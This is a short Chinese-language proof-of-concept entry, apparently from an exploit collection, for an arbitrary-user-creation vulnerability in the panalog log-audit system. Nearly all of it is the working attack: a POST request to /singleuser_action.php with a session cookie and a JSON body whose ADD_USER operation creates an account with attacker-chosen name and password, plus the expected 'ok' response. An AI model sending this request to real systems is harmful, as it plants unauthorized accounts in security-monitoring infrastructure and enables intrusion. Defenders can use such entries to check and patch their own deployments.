# panalog日志审计系统任意用户创建漏洞

- **系统**：panalog　|　**类型**：其他　|　**CVE**：—
- **请求**：`POST /singleuser_action.php HTTP/1.1`
- **关键头**：`Cookie: PHPSESSID=4dkc7q5hu7lkdlsfm5a0tcirn6`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
{ "syncInfo": { "user": { "userId": "118", "userName": "118", "employeeId": "118", "departmentId": "118", "departmentName": "118", "coporationId": "118", "corporationName": "118", "userSex": "1",  "userDuty": "118", "userBirthday": "118", "userPost": "118", "userPostCode": "118", "userAlias": "118", "userRank": "118", "userPhone": "118", "userHomeAddress": "118", "userMobilePhone": "118", "userMailAddress": "118", "userMSN": "118", "userNt": "118", "userCA": "118", "userPwd": "118", "userClass": "118", "parentId": "118", "bxlx": "118" },"operationType": "ADD_USER" } }
```
- **预期**：200　|　ok